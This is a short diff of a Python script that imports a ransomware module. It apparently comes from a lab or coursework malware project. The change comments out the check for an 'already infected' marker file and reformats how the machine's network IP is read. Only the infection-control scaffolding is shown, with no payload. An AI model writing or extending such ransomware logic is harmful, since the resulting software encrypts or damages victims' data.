@@ -24,11 +24,13 @@ from modules import ransomware
 NO_INFECTION_FILE = os.path.join(os.path.expanduser("~"), "GR0up7.pem")
 
 # Computer is already infected
-if os.path.exists(NO_INFECTION_FILE): exit()
+# if os.path.exists(NO_INFECTION_FILE): exit()
 
 # PUBLIC_IP = os.environ.get("USER")
-try: PUBLIC_IP = netifaces.ifaddresses('enp0s3')[netifaces.AF_INET][0]['addr']
-except ValueError: exit()
+try:
+    PUBLIC_IP = netifaces.ifaddresses("enp0s3")[netifaces.AF_INET][0]["addr"]
+except ValueError:
+    exit()
 print(f"Network IP: {PUBLIC_IP}")
 
 ###########################################################################################################################
